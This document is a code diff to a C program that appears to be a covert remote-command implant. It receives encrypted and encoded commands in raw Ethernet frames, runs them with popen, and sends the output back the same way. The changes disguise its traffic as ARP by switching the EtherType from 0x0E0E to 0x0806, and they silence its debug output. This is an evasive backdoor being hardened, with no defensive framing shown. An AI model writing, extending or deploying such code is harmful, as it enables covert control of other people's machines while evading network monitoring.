@@ -35,7 +35,7 @@ void CreatePacket(unsigned char* UserData,unsigned int UserDataLen) {
     //Beginning of Ethernet II Header
     memcpy((void*)FinalPacket,(void*)"\xFF\xFF\xFF\xFF\xFF\xFF",6); // DestMAC
     memcpy((void*)(FinalPacket+6),(void*)"\xCC\x0A\xF4\x6B\x70\xA8",6); // SrcMAC
-    memcpy((void*)(FinalPacket+12),(void*)"\x0E\x0E",2); 
+    memcpy((void*)(FinalPacket+12),(void*)"\x08\x06",2); 
     //memcpy((void*)(FinalPacket+14),(void*)"\x01",1); // Command bit and data
     memcpy((void*)(FinalPacket+14),(void*)UserData,UserDataLen); // Finally append our own data
     memcpy((void*)(FinalPacket+15+UserDataLen),(void*)"\x00",1); // a byte of zeros, to terminate the string
@@ -509,7 +509,7 @@ static void blowfishcbc(unsigned char *ar, int mode, int arsize) { // message st
 		for (n = 0; n < 8; n++) {
 			if (n < 4) {
 				if (beans <= 8 || beans >= (arsize-16)) {
-					printf("%02x",ar[beans + n]);
+					//-----printf("%02x",ar[beans + n]);
 				}
 				L += (int)ar[beans + n] & 0xff;
 				if (n != 3) {
@@ -518,7 +518,7 @@ static void blowfishcbc(unsigned char *ar, int mode, int arsize) { // message st
 			}
 			else {
 				if (beans <= 8 || beans >= (arsize-16)) {
-					printf("%02x",ar[beans + n]);
+					//-----printf("%02x",ar[beans + n]);
 				}
 				R += (int)ar[beans + n] & 0xff;
 				if (n != 7) {
@@ -542,7 +542,7 @@ static void blowfishcbc(unsigned char *ar, int mode, int arsize) { // message st
 		ar[beans + 7] = R & 0xff;
 		
 		if (beans <= 8 || beans >= (arsize-16)) {
-			printf(" L %08lX R %08lX\n", L, R);
+			//-----printf(" L %08lX R %08lX\n", L, R);
 		}
 		beans += 8;
 	}
@@ -578,8 +578,8 @@ static void encode(unsigned char *ar, int size) {
 			len++;
 		}
 		if (j < 6 || j > (size - 11)) {
-			printf("J2: %d I2: %d Size2: %d ", j, i, size);
-			printf("%c [%02x] ", in[i], in[i]);
+			//---printf("J2: %d I2: %d Size2: %d ", j, i, size);
+			//-----printf("%c [%02x] ", in[i], in[i]);
 		}
 		j++;
         }
@@ -587,7 +587,7 @@ static void encode(unsigned char *ar, int size) {
             encodeblock(in, out, len);
 		if (j < 7 || j > (size - 11)) {
 			out[4] = '\0';
-			printf("OUT: %s\n", out);
+			//-----printf("OUT: %s\n", out);
 		}
             for (i = 0; i < 4; i++) {
 		result[k] = out[i];
@@ -670,9 +670,9 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 		char bfr[50000];
 		FILE * fp;
 		if((fp=popen(commandbuf, "r")) == NULL) {
-		   printf("Error executing command buffer\n");
+		   //-----printf("Error executing command buffer\n");
 		}
-		printf("\n");
+		//-----printf("\n");
 		message[messagebuilder] = '\x0A'; // prepend with a newline for good formatting on shell responses
 		messagebuilder++;
 		while(fgets(bfr,50000,fp) != NULL){
@@ -716,17 +716,17 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 			//}
 			//messagechunk[chunker] = '\0';
 			//chunker++;
-			printf("PREBFM%sEND\n",messagechunk);
+			//----printf("PREBFM%sEND\n",messagechunk);
 			blowfishcbc(messagechunk, 0, chunker); // encode message, this returns null characters sometimes, so we need to mark the size beforehand
-			printf("BFMessagechunklen: %d\n", chunker);
+			//-----printf("BFMessagechunklen: %d\n", chunker);
 			int bfm;
-			printf("\nPREENC\n");
+			//----printf("\nPREENC\n");
 			for (bfm = 0; bfm < chunker; bfm++) {
 				if (bfm < 20 || bfm > (chunker - 20)) {
-					printf("(%02x)",messagechunk[bfm]);
+					//-----printf("(%02x)",messagechunk[bfm]);
 				}
 			}
-			printf("\nPREENCEND\n");
+			//----printf("\nPREENCEND\n");
 			//chunker++;
 			encode(messagechunk, chunker);
 			//printf("B64Messagelen: %d\n", strlen(messagechunk));
@@ -993,8 +993,8 @@ void ProcessPacket(u_char* Buffer, int Size) {
     ethhdr = (ETHER_HDR *)Buffer;
     ++total;
 
-    if (ntohs(ethhdr->type) == 0x0E0E) {
-	    printf("\n----------------------------------------------------------------------------------------------------------------\nEthertype: 0E0E\n");
+    if (ntohs(ethhdr->type) == 0x0806) {
+	    //printf("\n----------------------------------------------------------------------------------------------------------------\nEthertype: 0806\n");
 	    Buffer = (Buffer + 14); // skip 12 for mac addresses and 2 for ethertype
 	    Size = (Size - 14);
 	    PrintData(Buffer , Size);
